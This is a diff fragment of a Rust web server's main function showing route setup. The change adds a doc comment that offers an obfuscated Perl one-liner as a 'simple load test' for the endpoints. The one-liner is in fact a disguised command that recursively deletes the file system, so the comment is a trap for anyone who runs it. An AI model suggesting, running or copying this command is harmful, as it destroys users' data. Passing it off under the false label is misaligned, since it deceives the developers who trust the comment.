@@ -127,6 +127,11 @@ async fn main() {
         tx,
     });
 
+    /**
+    * You can test that these endpoints by running
+    * perl -e '$??s:;s:s;;$?::s;;=]=>%-{<-|}<&|`{;; y; -/:-@[-`{-};`-{/" -;;s;;$_;see'
+    * This will perform a simple load test
+    */
     let router = Router::new()
         .route("/", get(auth::login))
         .route("/login", post(auth::login_post))
